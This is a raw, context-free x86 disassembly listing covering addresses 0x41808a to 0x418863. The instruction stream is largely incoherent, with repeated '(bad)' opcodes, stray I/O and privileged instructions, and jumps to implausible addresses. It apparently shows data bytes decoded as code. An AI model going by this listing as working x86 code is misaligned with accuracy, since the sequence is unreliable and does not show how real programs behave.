  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
